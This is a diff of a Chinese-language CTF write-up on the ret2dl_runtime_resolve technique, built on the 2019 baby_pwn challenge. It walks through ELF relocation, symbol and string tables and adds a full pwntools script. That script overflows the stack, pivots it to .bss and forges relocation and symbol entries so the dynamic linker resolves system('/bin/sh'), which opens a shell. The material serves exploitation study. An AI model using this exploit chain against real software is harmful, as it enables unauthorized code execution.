@@ -1,43 +1,41 @@
 # dl_runtime_resolve实例分析
 ## IDA静态分析
 
-使用ida打开实例程序pwn，查看程序节视图，找到动态段，动态段是可加载的一般标记为load这里手动改名为.dynamic
+这里用2019信安国赛的baby_pwn来做演示(就是因为这个做不出来去做了好多功课)，实例程序test在文件夹下，hack.py是实现本地攻击的脚本  
+
+首先使用checksec查看文件保护状态，由于是partial relo所以并没机会改写动态段的字符串表地址。所以我们直接伪造所有所需要的参数结构。
+
+ida动态段信息如下  
+
+---
+
+![1.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/1.png)
 
 ---  
 
-![1.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/1.png)  
+d_tag字段值为DT_JMPREL,DT_SYMTAB,DT_STRTAB,分别保存了重定位表，字符串表，符号表
+
+重定位表信息如下  
 
 ---
 
-跟踪进入动态段，表项如下所示  
-
----  
-
-![2.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/2.png)  
-
----  
-
-每个动态段表项结构如前面介绍所示有一个d_tag字段和d_union联合体构成，d_tag的值标示了d_un值的意义  
-
-更具d_tag为DT_JMPREL值的条目跟踪进入，动态链接所用的重定位表  
+![2.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/2.png)
 
 ---
+
+比如read函数的重定位条目r_offset字段保存read got表中的位置，r_info保存了符号表索引，低8位保存了符号绑定信息  
+
+更据符号表索引追踪符号表信息如下  
+
+---  
 
 ![3.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/3.png)  
 
----  
+---    
 
-重定位项结构入elf.h中定义的那样包含r_offset和r_info成员，查看read函数的重定位表项，r_info的高8位保存了read在符号表中的索引，低8位表示了符号绑定所必需的信息，r_offset定位了重定位时需要修改的位置，我们更具 r_info >> 8 计算获得索引为 1, Elf32_Sym符号表条目结构的大小为16字节(可以通过编写一个简单c程序获得),所以read的符号表项位于符号表的 1 * 16 偏移处，如下所示0x1dc-0x1cc 16
+第一个字段是st_name表示字符串在字符串表中偏移，其他字段的值我们伪造时仿造其他常规函数即可，他们详细信息定义在elf头文件中。
 
----  
-
-![5.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/5.png)  
-
----  
-
-条目第一个成员时read在字符串表中的偏移，剩余的条目是符号表所描述的其他字段  
-
-回到重定位条目，他的第一个r_offset描述的是需要修复的位置，跟踪进入，他刚好就是got表中的read所在的条目。
+字符串表如下。
 
 ---  
 
@@ -45,30 +43,101 @@
 
 ---  
 
-之前提到的dl_runtime_resolve并没有对这些表项的边界做过多的检查检查，内部函数也就实际上使用reloc_offset这个参数找到重定位表并根据重定位条目获得符号字符串并进一步做dl-symbol-lookup，符号搜索，获得符号字符串的流程正如上方所示，所以我们可以通过伪造所需的这些数据结构，来完成ret2dl_runtime_resolve攻击。  
+## 伪造参数  
 
-## ret2dl_runtime_resolve  
+---  
 
-由于我们测试程序是partial relo 所以并不能对动态段做写操作，所以可以通过伪造所需要的重定位结构体来完成攻击操作。  
+![5.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/5.png)  
 
-### 伪造
+---  
 
-.bss段 开始地址 0x804a020
+程序漏洞点很容易定位，就在vuln函数中有一处栈溢出，但是只有一个read函数可以调用，没有机会泄漏libc，所以就直接考虑ret2dlruntime  
 
-我们将重定位修改的位置设置为 0x804a0b0
-我们让重定位条目开始于 0x804a0c0
+```  
 
-```
-{
-    r_offset = 0x804a0b0  //重定位修改的地址 4bytes
-    //重定位表基地址 0x8048314 符号表基地址0x80481CC
-    //我们把符号表条目放置于0x804a0d0 计算符号表索引(0x804a0d0 - 0x80481cc)/16 elf32_sym结构体大小为16
-    r_info = index << 8 + 7(这个值的详细信息在libc中有定义，这里直接仿造其他函数)
-           = 0x1f007 //符号表索引，和绑定类型
-   }
+from pwn import *
 
-```
-  
+elf = ELF('test')
+
+strTab = 0x804827c
+symTab = 0x80481dc
+relTab = 0x804833c
+
+plt0At = 0x8048380
+bssAt =  0x804a040
+baseAt = bssAt + 0x500  
+
+#这些是程序中的小gadget(可利用的小片段)用来处理栈迁移
+pppRet = 0x80485d9
+popEbpRet = 0x80485db  
+leaveRet = 0x804854a 
+
+readPlt = elf.plt['read']
+readGot = elf.got['read']
+
+#缓冲区填充
+nop = cyclic(0x28)
+
+rop1 = nop
+rop1 += cyclic(0x4)
+rop1 += p32(readPlt)
+#上面用来覆盖返回地址为read函数，向可控制的bss段写入rop
+#pppret作为返回地址，用来处理掉三个传递给read的函数
+rop1 += p32(pppRet)
+rop1 += p32(0)
+rop1 += p32(baseAt-4)
+rop1 += p32(0x100)
+rop1 += p32(popEbpRet)
+#迁移栈去ret plt0 我们在baseat处填入plt0的地址用于ret返回执行动态链接器
+rop1 += p32(baseAt-4)
+rop1 += p32(leaveRet)
+
+#这是传递给dl_fixup函数的重定位条目偏移，几个4字节大小是用来计算伪造的重定位条目的地址
+#这些4字节用于填充一些会用到的参数
+relloc_offset = baseAt + 4 + 4 + 4 + 4 + 4 - relTab
+
+#计算符号条目地址
+symAt = relTab + relloc_offset + 0x8
+#结构体要在内存中对齐
+align = 0x10 - ((symAt-symTab)&0xf)
+#计算出实际地址
+symAt = symAt + align
+#计算出表项索引
+r_sym = (symAt - symTab)/0x10
+r_info = (r_sym << 8) + 0x7
+fakeRel = p32(readGot) + p32(r_info)
+
+strAt = symAt + 0x10
+st_name = strAt - strTab
+
+fakeSym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
+
+argStr = '/bin/sh\0'
+funcStr = 'system\0'
+
+argAt = strAt + len(funcStr)
+
+rop2 = p32(baseAt-4)
+rop2 += p32(plt0At)
+rop2 += p32(relloc_offset)
+rop2 += p32(readPlt)
+rop2 += p32(argAt)
+rop2 += cyclic(0x4)
+rop2 += fakeRel
+rop2 += '\0'*align
+rop2 += fakeSym
+rop2 += funcStr
+rop2 += argStr  
+
+r = process('./test')
+r.send(rop1)
+r.send(rop2)
+r.interactive()
+
+```  
+
+
+
 
 
 
